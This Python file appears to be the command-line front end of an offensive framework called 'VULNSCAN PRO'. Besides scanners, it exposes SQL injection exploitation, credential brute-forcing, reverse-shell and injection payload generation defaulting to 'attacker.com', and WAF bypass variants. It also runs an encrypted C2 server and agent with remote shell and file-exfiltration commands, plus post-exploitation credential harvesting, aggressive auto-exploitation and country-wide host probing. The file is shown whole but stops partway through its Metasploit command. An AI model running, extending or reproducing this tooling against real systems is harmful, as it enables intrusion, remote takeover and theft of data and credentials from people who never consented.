"""
Advanced Vulnerability Scanner CLI — Enterprise Edition
Cross-platform: Windows PowerShell + Kali Linux
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

import click
from colorama import Fore, Style

from platform_core import (
    PLATFORM,
    PRIVILEGE,
    banner as core_banner,
    colorize,
    load_config,
    save_config,
    setup_logging,
    supports_color,
    scan_id,
)
from scanner import AdvancedReconScanner
from reporter import ReportGenerator
from web_scanner import WebVulnerabilityScanner
from crypto_scanner import CryptoScanner
from auth_scanner import AuthScanner
from misconfig_scanner import MisconfigScanner
from dependency_scanner import DependencyScanner
from sqli_exploiter import SQLiExploiter
from bruteforce_exploiter import CredentialBruteForcer
from payload_generator import PayloadGenerator
from post_exploiter import PostExploiter
from msf_integration import MetasploitRPC, MsfPayloadGenerator
from waf_bypass import WAFDetector, WAFBypass, WAFEvader
from exploit_orchestrator import ExploitOrchestrator, AutoExploitStrategy, ExploitAggregator
import global_scan
from c2_module import C2Server, C2Agent, ALLOWED_TASK_TYPES

CONFIG = load_config()


# ---------------------------------------------------------------------------
# Output helpers (color-aware, degrade gracefully on dumb terminals)
# ---------------------------------------------------------------------------

_COLOR = supports_color()


def _c(text: str, color: str) -> str:
    return colorize(text, color, enabled=_COLOR)


def err(msg: str) -> None:
    click.echo(_c(f"[!] ERROR: {msg}", Fore.RED))


def ok(msg: str) -> None:
    click.echo(_c(f"[+] {msg}", Fore.GREEN))


def info(msg: str) -> None:
    click.echo(_c(f"[*] {msg}", Fore.CYAN))


def warn(msg: str) -> None:
    click.echo(_c(f"[!] {msg}", Fore.YELLOW))


@click.group()
@click.version_option(version="3.1.0", prog_name="vulnscan-pro")
@click.option('--log-file', '-L', default=None, type=click.Path(),
              help='Write structured logs to this file (JSON lines supported)')
@click.option('--json-logs', is_flag=True, default=False, help='Log in JSON-lines format')
@click.option('--quiet', '-q', is_flag=True, default=False, help='Suppress console log output')
@click.option('--no-color', is_flag=True, default=False, help='Disable colored output')
@click.pass_context
def cli(ctx, log_file: Optional[str], json_logs: bool, quiet: bool, no_color: bool):
    """VULNSCAN PRO — Enterprise Vulnerability Scanner & Exploitation Framework

    Runs natively on Windows PowerShell and Kali Linux.
    """
    global _COLOR
    if no_color:
        _COLOR = False
    if log_file:
        setup_logging(log_file=Path(log_file), json_lines=json_logs, quiet=quiet)
    ctx.obj = {"config": CONFIG, "scan_id": scan_id()}


def print_header():
    """Print enterprise banner with platform info"""
    click.echo(_c(core_banner(CONFIG.get("ui", {}).get("banner", "enterprise")), Fore.CYAN))


# ==================== ADVANCED MODULES ====================


def _split_service_target(value: str, allowed: List[str]) -> Tuple[str, str]:
    """Parse 'mysql:10.0.0.5' -> ('mysql', '10.0.0.5').

    Mirrors modules.base.split_service_target without importing the modules package,
    which triggers a circular import back into core while cli.py is initialising.
    """
    if ':' not in value:
        raise ValueError(f"Expected format service:host, e.g. {allowed[0]}:10.0.0.5")
    service, _, host = value.partition(':')
    service = service.strip().lower()
    if service not in allowed:
        raise ValueError(f"Service '{service}' not supported (choose {', '.join(allowed)})")
    host = host.strip()
    if '://' in host:
        host = host.split('://', 1)[1]
    return service, host.split('/', 1)[0].split(':', 1)[0]


# ==================== RECONNAISSANCE & SCANNING ====================


def _vuln_dict(vuln) -> Dict[str, Any]:
    """Normalise a scanner vulnerability object into a JSON-friendly dict."""
    if hasattr(vuln, '__dict__'):
        return {k: (v.value if hasattr(v, 'value') else v) for k, v in vuln.__dict__.items()}
    return {'value': str(vuln)}


def _print_vulns(vulns: List[Any], limit: int = 10) -> None:
    """Print vulnerability objects using their first string attributes."""
    for vuln in vulns[:limit]:
        data = _vuln_dict(vuln)
        label = (data.get('name') or data.get('title') or data.get('vulnerability_type')
                 or data.get('id') or 'Finding')
        where = data.get('endpoint') or data.get('package') or ''
        severity = str(data.get('severity', 'INFO')).upper()
        click.echo(f"  {_c(f'[{severity}]', Fore.RED)} {label} {where}".rstrip())
    if len(vulns) > limit:
        click.echo(f"  ... {len(vulns) - limit} more")


def _run_header_scan(title: str, target: str,
                     scan: Callable[[], Tuple[List[Any], Dict[str, str]]]) -> None:
    """Fetch headers once, run a header-based scanner, print and summarise results."""
    from requests import RequestException

    print_header()
    info(f"{title} on {target}\n")
    url = target if target.startswith(('http://', 'https://')) else f"https://{target}"

    try:
        import requests as _rq
        headers = _rq.get(url, timeout=10, allow_redirects=True).headers
    except RequestException as e:
        err(f"Could not fetch headers from {url}: {e}")
        return

    vulns, extras = scan(headers)
    if vulns:
        warn(f"Found {len(vulns)} finding(s)\n")
        _print_vulns(vulns)
        click.echo()
    else:
        ok("No issues detected by this module")
    if extras:
        for key, value in extras.items():
            click.echo(f"  {_c(key, Fore.CYAN)}: {value}")


def _scan_auth_defaults(host: str, port: Optional[int]) -> Tuple[List[Any], Dict[str, str]]:
    """Reusable default-credentials check (also used by the menu module 04)."""
    services = sorted(AuthScanner.DEFAULT_CREDENTIALS)
    service, resolved_host = _split_service_target(host, services)
    scanner = AuthScanner()
    endpoint = f"{resolved_host}:{port}" if port else resolved_host
    vulns = scanner.check_default_credentials(service, endpoint)
    return vulns, {
        "Service": service,
        "Endpoint": endpoint,
        "Credential sets": str(len(AuthScanner.DEFAULT_CREDENTIALS.get(service, []))),
    }


@cli.command()
@click.option('--target', '-t', required=True, help='Target IP or hostname')
@click.option('--ports', '--port', '-p', default=None, help='Comma-separated ports')
@click.option('--timeout', default=5, help='Socket timeout in seconds')
@click.option('--output', '-o', default=None, help='Output file')
@click.option('--format', '-f', type=click.Choice(['text', 'json', 'csv']), default='text')
def scan(target: str, ports: Optional[str], timeout: int, output: Optional[str], format: str):
    """Perform comprehensive vulnerability scan"""
    print_header()
    print(f"{Fore.CYAN}[*] Scanning {Fore.GREEN}{target}{Style.RESET_ALL}\n")

    try:
        scanner = AdvancedReconScanner(target, timeout=timeout)
        print(f"{Fore.CYAN}[*] Resolving DNS...")
        dns_info = scanner.check_dns()
        if 'error' not in dns_info:
            print(f"    IP: {Fore.GREEN}{dns_info['ip']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Scanning ports...")
        if ports:
            port_list = [int(p.strip()) for p in ports.split(',')]
            services = scanner.port_scan(port_list)
        else:
            services = scanner.port_scan()

        if services:
            print(f"{Fore.YELLOW}[+] Found {len(services)} open services")
            for svc in services[:5]:
                print(f"    {Fore.GREEN}Port {svc.port}: {svc.service}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Checking vulnerabilities...")
        vulns = scanner.check_vulnerabilities()

        if vulns:
            print(f"{Fore.RED}[!] Found {len(vulns)} vulnerabilities")

        summary = scanner.get_summary()
        print(f"\n{Fore.CYAN}SUMMARY: {summary['total_services']} services, "
              f"{summary['critical']} critical, {summary['high']} high\n")

        # Optional report export (text/JSON/CSV)
        if output:
            from pathlib import Path as _P
            out_path = _P(output)
            out_path.parent.mkdir(parents=True, exist_ok=True)
            report_data = {
                "target": target,
                "timestamp": __import__('datetime').datetime.now().isoformat(),
                "summary": summary,
                "dns_info": dns_info,
                "services": [
                    {"port": s.port, "service": s.service,
                     "banner": getattr(s, 'banner', ''), "vulnerabilities": [
                         v.__dict__ for v in getattr(s, 'vulnerabilities', [])]}
                    for s in services
                ],
                "vulnerabilities": [v.__dict__ for v in vulns],
            }
            fmt = format.lower()
            if fmt == 'json':
                import json as _json
                out_path.write_text(_json.dumps(report_data, indent=2, default=str), encoding='utf-8')
            elif fmt == 'csv':
                import csv as _csv
                with out_path.open('w', newline='', encoding='utf-8') as fh:
                    w = _csv.writer(fh)
                    w.writerow(['port', 'service', 'banner'])
                    for s in services:
                        w.writerow([s.port, s.service, getattr(s, 'banner', '')])
            else:
                lines = [f"Target: {target}", f"Services: {summary['total_services']}",
                         f"Critical: {summary['critical']}  High: {summary['high']}  "
                         f"Medium: {summary['medium']}  Low: {summary['low']}", ""]
                for v in vulns:
                    lines.append(f"[{v.severity.value if hasattr(v.severity, 'value') else v.severity}] "
                                 f"{v.title}: {v.description}")
                out_path.write_text("\n".join(lines), encoding='utf-8')
            print(f"{Fore.GREEN}[+] Report saved: {out_path}{Style.RESET_ALL}")

    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--target', '-t', required=True, help='Target hostname')
@click.option('--endpoint', '-e', multiple=True,
              help='Endpoint to test (repeatable, default: /login /search /api/users /submit)')
def web_scan(target: str, endpoint: Tuple[str, ...]):
    """Scan for web vulnerabilities (SQLi, XSS, CSRF)"""
    print_header()
    info(f"Web vulnerability scan on {target}\n")

    endpoints = list(endpoint) or ["/login", "/search", "/api/users", "/submit"]
    try:
        scanner = WebVulnerabilityScanner(target)
        info(f"Testing {len(endpoints)} endpoint(s)...")
        web_vulns = scanner.scan_sql_injection(endpoints) + scanner.scan_xss(endpoints)

        if web_vulns:
            warn(f"Found {len(web_vulns)} web vulnerability(ies)\n")
            _print_vulns(web_vulns)
        else:
            ok("No SQLi / XSS patterns matched on the tested endpoints")
    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--target', '-t', required=True, help='Target hostname or URL')
def crypto_scan(target: str):
    """Check TLS version and cipher policy"""
    print_header()
    info(f"Crypto / TLS policy scan on {target}\n")

    tls_version = CONFIG.get('scan', {}).get('tls_version', 'TLSv1.2')
    ciphers = CONFIG.get('scan', {}).get('ciphers') or ['AES-256-GCM']
    try:
        scanner = CryptoScanner()
        vulns = scanner.check_tls_configuration(tls_version, list(ciphers))
        if vulns:
            warn(f"Found {len(vulns)} cryptographic weakness(es)\n")
            _print_vulns(vulns)
        else:
            ok(f"{tls_version} with {', '.join(ciphers)} meets policy")
    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--target', '-t', required=True, help='service:host, e.g. mysql:10.0.0.5')
@click.option('--port', '--service-port', '-p', default=None, type=int, help='Override port')
def auth_scan(target: str, port: Optional[int]):
    """Check services for vendor default credentials"""
    print_header()
    info(f"Authentication scan on {target}\n")
    try:
        vulns, extras = _scan_auth_defaults(target, port)
        if vulns:
            warn(f"Found {len(vulns)} default credential set(s)\n")
            _print_vulns(vulns)
        else:
            ok(f"No known default credentials for {extras['Service']}")
        for key, value in extras.items():
            click.echo(f"  {_c(key, Fore.CYAN)}: {value}")
    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--target', '-t', required=True, help='Target hostname or URL')
def misconfig_scan(target: str):
    """Check CORS, security headers and information disclosure"""
    def scan(headers) -> Tuple[List[Any], Dict[str, str]]:
        scanner = MisconfigScanner()
        vulns = (scanner.check_cors_misconfiguration(headers)
                 + scanner.detect_information_disclosure(headers))
        return vulns, {"Headers analysed": str(len(headers))}

    try:
        _run_header_scan("Misconfiguration scan", target, scan)
    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--manifest', '-m', default='requirements.txt',
              help='requirements.txt / package.json (or comma-separated name==version list)')
def dependency_scan(manifest: str):
    """Match project dependencies against the bundled CVE table"""
    print_header()
    info(f"Dependency vulnerability scan on {manifest}\n")

    try:
        # Modules are numbered, so they cannot be imported with a normal statement.
        deps_module = __import__('modules.08_dependency_scan', fromlist=['_load_manifest'])
        dependencies = deps_module._load_manifest(manifest)
        if not dependencies:
            dependencies = deps_module._parse_pairs(manifest)
        if not dependencies:
            err(f"Could not read any dependencies from '{manifest}'")
            return

        scanner = DependencyScanner()
        vulns = scanner.check_dependencies(dependencies)
        if vulns:
            warn(f"{len(vulns)} vulnerable package(s) out of {len(dependencies)}\n")
            _print_vulns(vulns)
        else:
            ok(f"No known CVEs for {len(dependencies)} dependency(ies)")
    except Exception as e:
        err(str(e))


@cli.command('global-scan')
@click.option('--country', '-c', 'countries', multiple=True,
              help='ISO alpha-2 code (repeatable or comma-separated); omit for all countries')
@click.option('--samples', default=5, type=int, help='Prefixes to inspect per country (1-20)')
@click.option('--prefix-source', default=None,
              help='Local CIDR file instead of downloading the public route report')
@click.option('--workers', default=global_scan.MAX_WORKERS, type=int, help='Parallel country probes')
@click.option('--output', '-o', default=None, help='Write the JSON report to this file')
def global_scan_cmd(countries: Tuple[str, ...], samples: int, prefix_source: Optional[str],
                    workers: int, output: Optional[str]):
    """Probe the public web surface of every country (or the listed ones)"""
    print_header()
    try:
        codes = global_scan.normalize_countries(list(countries) or None)
    except ValueError as e:
        err(str(e))
        return

    samples = max(1, min(samples, 20))
    label = 'all countries' if codes == ['all'] else ', '.join(codes)
    info(f"Global scan: {label} — {samples} prefix(es) per country\n")
    warn("Authorized use only: this probes public hosts, no payloads are sent")

    progress = lambda line: click.echo('   ' + line)
    try:
        report = global_scan.scan_countries(codes, samples=samples,
                                            source=prefix_source, workers=workers,
                                            progress=progress)
    except Exception as e:
        err(str(e))
        return

    click.echo()
    for country in report['countries']:
        if country['status'] != 'ok':
            click.echo(f"  {country['country']:<3} {country['name']:<32} {country['status']}")
            continue
        reachable = country['reachable_hosts']
        color = Fore.RED if reachable else Fore.GREEN
        click.echo(f"  {country['country']:<3} {country['name']:<32} "
                   f"{country['samples']:>2} sample(s) {_c(str(reachable), color)} reachable")

    ok(f"{report['ok']} countries with data, {report['reachable_hosts']} reachable hosts, "
       f"{report['duration_seconds']}s")

    if output:
        out_path = Path(output)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding='utf-8')
        ok(f"Report saved: {out_path}")


# ==================== EXPLOITATION ====================

@cli.command()
@click.option('--url', '-u', required=True, help='Target URL')
@click.option('--param', '-p', default='id', help='Parameter name')
def sqli_exploit(url: str, param: str):
    """Exploit SQL injection"""
    print_header()
    print(f"{Fore.CYAN}[*] Testing SQL injection on {Fore.GREEN}{url}{Style.RESET_ALL}\n")

    try:
        exploiter = SQLiExploiter(url)
        test_params = {param: "1"}

        print(f"{Fore.CYAN}[*] Testing error-based...")
        error_based = exploiter.test_error_based(test_params)

        print(f"{Fore.CYAN}[*] Testing time-based...")
        time_based = exploiter.test_time_based_blind(test_params)

        all_exploits = error_based + time_based
        if all_exploits:
            print(_c("[!] SQL INJECTION FOUND", Fore.RED) + "\n")
            for exploit in all_exploits[:3]:
                print(f"  {_c('Method:', Fore.YELLOW)} {exploit.parameter}")
                print(f"  {_c('Payload:', Fore.YELLOW)} {exploit.payload}\n")
            warn("Vulnerable parameter — remediate with parameterized queries")
        else:
            ok("No SQL injection found (parameter looks safe)")

    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--host', required=True, help='Target host')
@click.option('--service', '-s', default='ssh', help='Service (ssh, ftp, mysql, postgresql)')
@click.option('--port', '-P', default=None, type=int, help='Target port (default: per service)')
def bruteforce(host: str, service: str, port: int):
    """Brute-force credentials"""
    print_header()
    print(f"{Fore.CYAN}[*] Brute-forcing {service} on {Fore.GREEN}{host}{Style.RESET_ALL}\n")

    try:
        bruteforcer = CredentialBruteForcer(max_attempts=5)
        results = []

        if service == "ssh":
            results = bruteforcer.test_ssh(host, port or 22)
        elif service == "ftp":
            results = bruteforcer.test_ftp(host, port or 21)
        elif service == "mysql":
            results = bruteforcer.test_database(host, port or 3306, "mysql")
        elif service == "postgresql":
            results = bruteforcer.test_database(host, port or 5432, "postgresql")

        successful = [r for r in results if r.success]
        if successful:
            print(_c("[+] CREDENTIALS FOUND", Fore.RED) + "\n")
            for r in successful:
                print(f"  {_c('Username:', Fore.YELLOW)} {r.username}")
                print(f"  {_c('Password:', Fore.YELLOW)} {r.password}\n")
            warn("Change these credentials immediately if this is your system")
        elif results:
            ok(f"No weak credentials found after {len(results)} attempts (host secure)")
        else:
            warn(f"No login attempts were made for '{service}' — "
                 "use --service ssh, ftp, mysql or postgresql")

    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--type', 'payload_type', required=True,
              type=click.Choice(['xss', 'sqli', 'command_injection', 'command-injection',
                                 'path_traversal', 'path-traversal', 'reverse_shell',
                                 'reverse-shell']))
@click.option('--host', default='attacker.com', help='Attacker host for reverse shell')
@click.option('--listen-port', 'listen_port', default=4444, type=int, help='Attacker callback port')
@click.option('--encoding', '-e', type=click.Choice(['plain', 'base64', 'url', 'hex']), default='plain')
def generate_payload(payload_type: str, host: str, listen_port: int, encoding: str):
    """Generate exploitation payloads"""
    print_header()
    type = payload_type.replace('-', '_')
    print(f"{Fore.CYAN}[*] Generating {type} payloads\n")

    try:
        gen = PayloadGenerator()

        if type == "xss":
            payloads = gen.generate_xss_payloads()
            print(f"{Fore.YELLOW}XSS Payloads:")
            for i, p in enumerate(payloads[:5], 1):
                print(f"  {i}. {p}")
        elif type == "sqli":
            payloads = gen.generate_sql_injection_payloads()
            print(f"{Fore.YELLOW}SQLi Payloads:")
            for i, p in enumerate(payloads[:5], 1):
                print(f"  {i}. {p}")
        elif type == "command_injection":
            payloads = gen.generate_command_execution_payloads()
            print(f"{Fore.YELLOW}Command Injection:")
            for i, p in enumerate(payloads[:5], 1):
                print(f"  {i}. {p}")
        elif type == "path_traversal":
            payloads = gen.generate_path_traversal_payloads()
            print(f"{Fore.YELLOW}Path Traversal:")
            for i, p in enumerate(payloads[:5], 1):
                print(f"  {i}. {p}")
        elif type == "reverse_shell":
            payload = gen.generate_reverse_shell("bash", host, listen_port)
            if encoding != "plain":
                payload = (gen.encode_base64(payload) if encoding == "base64" else
                          gen.encode_url(payload) if encoding == "url" else
                          gen.encode_hex(payload))
            print(f"{Fore.GREEN}Reverse Shell:")
            print(f"  {payload}\n")

    except Exception as e:
        err(str(e))


@cli.command()
def config_show():
    """Show effective configuration (defaults merged with config.yaml)"""
    print_header()
    click.echo(json.dumps(CONFIG, indent=2, ensure_ascii=False))


@cli.command()
@click.option('--timeout', default=None, type=int, help='Default scan timeout (seconds)')
@click.option('--output-dir', default=None, help='Default report output directory')
def config_set(timeout: Optional[int], output_dir: Optional[str]):
    """Persist configuration changes to config.yaml"""
    print_header()
    if timeout:
        CONFIG["scan"]["default_timeout"] = timeout
    if output_dir:
        CONFIG["report"]["output_dir"] = output_dir
    target = Path("config.yaml")
    if save_config(CONFIG, target):
        ok(f"Configuration saved to {target}")
    else:
        err("Failed to save configuration")


@cli.command()
def platform_info():
    """Show detailed platform & privilege information"""
    print_header()
    click.echo(f"  OS        : {PLATFORM.os_name}")
    click.echo(f"  Kernel    : {PLATFORM.kernel}")
    click.echo(f"  Arch      : {PLATFORM.machine}")
    click.echo(f"  Shell     : {PLATFORM.shell}")
    click.echo(f"  Python    : {PLATFORM.python_version}")
    click.echo(f"  Hostname  : {PLATFORM.hostname}")
    click.echo(f"  Kali      : {PLATFORM.is_kali}")
    click.echo(f"  WSL       : {PLATFORM.is_wsl}")
    click.echo(f"  Privilege : {PRIVILEGE.value}")


# ==================== COMMAND & CONTROL (C2) ====================

@cli.command()
@click.option('--host', default='0.0.0.0', help='Bind address')
@click.option('--port', '-p', default=8080, type=int, help='Listen port')
@click.option('--key', '-k', required=True, help='Shared secret (agents must match)')
@click.option('--state', default='c2_state.json', help='Session/task state file')
def c2_server(host: str, port: int, key: str, state: str):
    """Start the encrypted C2 server"""
    print_header()
    warn("Authorized testing only — run only against systems you own/have permission for")
    try:
        server = C2Server(host, port, key, state_file=Path(state))
        server.serve_forever()
    except KeyboardInterrupt:
        ok("C2 server stopped")
    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--server', '-s', required=True, help='C2 URL, e.g. http://10.0.0.1:8080')
@click.option('--key', '-k', required=True, help='Shared secret (must match server)')
@click.option('--check-in', default=5, type=int, help='Beacon interval in seconds')
def c2_agent(server: str, key: str, check_in: int):
    """Run a C2 agent (cross-platform: PowerShell + Kali)"""
    print_header()
    warn("Authorized testing only")
    try:
        agent = C2Agent(server, key, check_in=check_in)
        agent.run()
    except KeyboardInterrupt:
        ok("Agent stopped")
    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--server', '-s', required=True, help='C2 URL')
@click.option('--key', '-k', required=True, help='Shared secret')
def c2_sessions(server: str, key: str):
    """List active C2 sessions"""
    try:
        import requests as _rq
        from c2_module import C2Crypto
        crypto = C2Crypto(key)
        resp = _rq.get(f"{server.rstrip('/')}/sessions", timeout=5)
        data = resp.json()
        if "enc" in data:
            data = json.loads(crypto.decrypt(data["enc"]))
        sessions = data.get("sessions", [])
        if not sessions:
            info("No sessions registered")
            return
        print_header()
        online = sum(1 for s in sessions if s.get('status') == 'online')
        click.echo(f"  {_c(str(online), Fore.GREEN)} online / "
                   f"{_c(str(len(sessions)), Fore.CYAN)} total\n")
        for s in sessions:
            status = s.get('status', 'unknown')
            color = Fore.GREEN if status == 'online' else Fore.RED
            click.echo(f"  {_c(status.upper(), color):<17} {s['session_id']:<18} "
                       f"{s['hostname']:<24} {s['platform'][:26]:<28} "
                       f"{s['privilege']:<10} last: {s['last_seen'][:19]}")
    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--server', '-s', required=True, help='C2 URL')
@click.option('--key', '-k', required=True, help='Shared secret')
@click.option('--session', required=True, help='Target session ID')
@click.option('--type', 'task_type', required=True,
              type=click.Choice(sorted(ALLOWED_TASK_TYPES)), help='Task type')
@click.option('--cmd', default=None, help='Command for shell task')
@click.option('--path', default=None, help='Path for read_file / list_dir / download / upload')
def c2_task(server: str, key: str, session: str, task_type: str,
            cmd: Optional[str], path: Optional[str]):
    """Queue a task on a C2 session"""
    try:
        import requests as _rq
        from c2_module import C2Crypto
        crypto = C2Crypto(key)
        base = server.rstrip('/')
        # Validate session exists
        resp = _rq.get(f"{base}/sessions", timeout=5)
        data = resp.json()
        if "enc" in data:
            data = json.loads(crypto.decrypt(data["enc"]))
        known = {s['session_id'] for s in data.get('sessions', [])}
        if session not in known:
            err(f"Unknown session '{session}'. Known: {sorted(known) or '(none)'}")
            return
        payload: Dict[str, Any] = {}
        if cmd:
            payload['cmd'] = cmd
        if path:
            payload['path'] = path
        enc = {'enc': crypto.encrypt(json.dumps({
            'queue': {'session_id': session, 'task_type': task_type,
                      'payload': payload}}))}
        r2 = _rq.post(f"{base}/beacon", json=enc, timeout=5)
        d2 = r2.json()
        if "enc" in d2:
            d2 = json.loads(crypto.decrypt(d2["enc"]))
        if d2.get('queued'):
            ok(f"Queued {task_type} for {session} (task {d2.get('task_id')})")
        else:
            err(f"Queue rejected: {d2}")
    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--server', '-s', required=True, help='C2 URL')
@click.option('--key', '-k', required=True, help='Shared secret')
@click.option('--session', required=True, help='Target session ID')
@click.option('--path', required=True, help='Remote file to exfiltrate')
@click.option('--out', required=True, type=click.Path(), help='Local file to save to')
def c2_download(server: str, key: str, session: str, path: str, out: str):
    """Exfiltrate a file from an agent (queue + wait + save)"""
    try:
        import requests as _rq
        import base64 as _b64
        import time as _time
        from c2_module import C2Crypto, C2Server  # noqa: F401
        crypto = C2Crypto(key)
        base = server.rstrip('/')

        # 1) queue the download task
        enc = {'enc': crypto.encrypt(json.dumps({
            'queue': {'session_id': session, 'task_type': 'download',
                      'payload': {'path': path}}}))}
        r = _rq.post(f"{base}/beacon", json=enc, timeout=5)
        d = r.json()
        if "enc" in d:
            d = json.loads(crypto.decrypt(d["enc"]))
        if not d.get('queued'):
            err(f"Queue rejected: {d}")
            return
        task_id = d['task_id']
        info(f"Download queued as {task_id} — waiting for agent...")

        # 2) poll /tasks until the result arrives
        for _ in range(60):
            _time.sleep(2)
            rt = _rq.get(f"{base}/tasks", timeout=5)
            dt = rt.json()
            if "enc" in dt:
                dt = json.loads(crypto.decrypt(dt["enc"]))
            task = next((t for t in dt.get('tasks', []) if t['task_id'] == task_id), None)
            if task and task['status'] in ('done', 'error'):
                break
        else:
            err("Timed out waiting for agent to deliver the file")
            return

        result = task.get('result') or {}
        if not result.get('ok'):
            err(f"Agent download failed: {result.get('error', 'unknown')}")
            return

        # 3) decode + save locally
        b64 = (result.get('data') or {}).get('b64', '')
        raw = _b64.b64decode(b64)
        out_path = Path(out)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_bytes(raw)
        ok(f"Exfiltrated {len(raw)} bytes -> {out_path}")
    except Exception as e:
        err(str(e))


# ==================== POST-EXPLOITATION ====================

@cli.command()
@click.option('--host', default='local',
              help="Target host to enumerate. Only 'local' (this machine) is supported today.")
@click.option('--session', default=None,
              help='Optional session label recorded in the output, e.g. user@target')
@click.option('--json', 'as_json', is_flag=True, default=False, help='Output full raw JSON')
@click.option('--no-redact', is_flag=True, default=False, help='Do not redact secrets')
@click.option('--limit', default=10, type=int, help='Max processes/connections to list')
def post_exploit(host: str, session: Optional[str], as_json: bool, no_redact: bool, limit: int):
    """Gather post-exploitation info (cross-platform)"""
    print_header()
    info(f"Post-exploitation enumeration on {host}"
         f"{' (session ' + session + ')' if session else ''}\n")

    if host.lower() not in ('local', 'localhost', '127.0.0.1', '.', ''):
        err(f"Remote enumeration of '{host}' is not implemented yet — "
            "run this command on the target (or use --host local).")
        raise SystemExit(2)

    try:
        exploiter = PostExploiter(redact=not no_redact)
        pe_data = exploiter.gather_all_info()

        if as_json:
            click.echo(json.dumps(pe_data, indent=2, ensure_ascii=False))
            return

        click.echo(_c("SYSTEM:", Fore.CYAN))
        click.echo(exploiter.format_summary(pe_data))

        creds = pe_data.get("credentials", [])
        if creds:
            click.echo(f"\n{_c('CREDENTIAL ARTIFACTS:', Fore.RED)}")
            for cred in creds[:5]:
                click.echo(f"  {_c(cred['severity'].upper(), Fore.LIGHTRED_EX)} "
                           f"{cred['data_type']} -> {cred['source_path']}")

        sudo = pe_data.get("sudo_access", [])
        if sudo:
            click.echo(f"\n{_c('SUDO / ADMIN ACCESS:', Fore.YELLOW)}")
            for s in sudo[:5]:
                click.echo(f"  {s}")

        click.echo()

    except Exception as e:
        err(str(e))


# ==================== WAF DETECTION & BYPASS ====================

@cli.command()
@click.option('--url', '-u', required=True, help='Target URL')
def detect_waf(url: str):
    """Detect WAF protection"""
    print_header()
    print(f"{Fore.CYAN}[*] Detecting WAF on {Fore.GREEN}{url}{Style.RESET_ALL}\n")

    try:
        detector = WAFDetector(url)
        detection = detector.detect_waf()

        if detection.detected:
            print(f"{Fore.RED}[!] WAF DETECTED\n")
            print(f"  Type: {Fore.LIGHTRED_EX}{detection.waf_type}{Style.RESET_ALL}")
            print(f"  Confidence: {detection.confidence * 100:.1f}%")
            print(f"\n  Indicators:")
            for ind in detection.indicators[:3]:
                print(f"    - {ind}")
        else:
            print(f"{Fore.GREEN}[*] No WAF detected\n")

    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--payload', '-p', required=True, help='Payload to bypass')
@click.option('--technique', '-t', type=click.Choice(['all', 'case', 'encode', 'comment', 'concat']), default='all')
def waf_bypass_cmd(payload: str, technique: str):
    """Generate WAF bypass payloads"""
    print_header()
    print(f"{Fore.CYAN}[*] Generating WAF bypass variants\n")

    try:
        if technique == 'all':
            bypasses = WAFBypass.generate_all_bypasses(payload)
            print(f"{Fore.YELLOW}Case Variations:")
            for v in bypasses['case_variation'][:2]:
                print(f"  {v}")
            print(f"\n{Fore.YELLOW}Encodings:")
            print(f"  URL: {bypasses['url_encode'][0][:40]}...")
            print(f"  Hex: {bypasses['hex_encode'][0][:40]}...")
        elif technique == 'case':
            for v in WAFBypass.case_variation(payload)[:3]:
                print(f"  {v}")
        elif technique == 'encode':
            print(f"  URL: {WAFBypass.url_encode_bypass(payload)}")
            print(f"  Hex: {WAFBypass.hex_encode(payload)}")
        elif technique == 'comment':
            for v in WAFBypass.sql_comment_bypass(payload)[:3]:
                print(f"  {v}")
        elif technique == 'concat':
            for v in WAFBypass.sql_concatenation(payload)[:3]:
                print(f"  {v}")

        print()

    except Exception as e:
        err(str(e))


# ==================== AUTO-EXPLOITATION ORCHESTRATOR ====================

@cli.command()
@click.option('--target', '-t', required=True, help='Target hostname')
@click.option('--strategy', '-s', type=click.Choice(['aggressive', 'moderate', 'conservative']), default='moderate')
@click.option('--max-jobs', '-j', default=5, type=int, help='Max parallel jobs')
def auto_exploit(target: str, strategy: str, max_jobs: int):
    """Automatically exploit all vulnerabilities"""
    print_header()
    print(f"{Fore.CYAN}[*] Auto-exploitation on {Fore.GREEN}{target}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Strategy: {Fore.LIGHTRED_EX}{strategy.upper()}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Max jobs: {max_jobs}\n")

    try:
        orchestrator = ExploitOrchestrator(target, max_workers=max_jobs)
        aggregator = ExploitAggregator()

        exploits = AutoExploitStrategy.get_strategy(strategy)

        for i, (exploit_type, description, payload) in enumerate(exploits):
            orchestrator.queue_exploit(f"exploit_{i}", description, exploit_type, payload)
            print(f"{Fore.CYAN}[+] {description}")

        print(f"\n{Fore.CYAN}[*] Executing...\n")

        def callback(job):
            aggregator.add_result(job)
            color = Fore.GREEN if job.status.value == "success" else Fore.RED
            print(f"{color}[{job.status.value.upper()}]{Style.RESET_ALL} {job.id}")

        results = orchestrator.execute_queue(callback=callback)

        print(f"\n{Fore.CYAN}SUMMARY:")
        print(f"  Total: {results['total_jobs']}")
        print(f"  {Fore.GREEN}Successful: {results['successful']}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Failed: {results['failed']}{Style.RESET_ALL}")
        total = results['total_jobs'] or 1
        print(f"  Rate: {results['successful'] / total * 100:.1f}%\n")

    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--target', '-t', required=True, help='Target hostname')
def msf_integration(target: str):
    """Metasploit integration"""
    print_header()
    print(f"{Fore.CYAN}[*] Connecting to Metasploit RPC on localhost:55553\n")
    print(f"{Fore.YELLOW}[!] Requires: msfconsole running with RPC enabled\n")

    try:
        msf = MetasploitRPC(
            CONFIG.get('msf', {}).get('host', 'localhost'),
            int(CONFIG.get('msf', {}).get('port', 55553)),
            CONFIG.get('msf', {}).get('token', ''),
        )

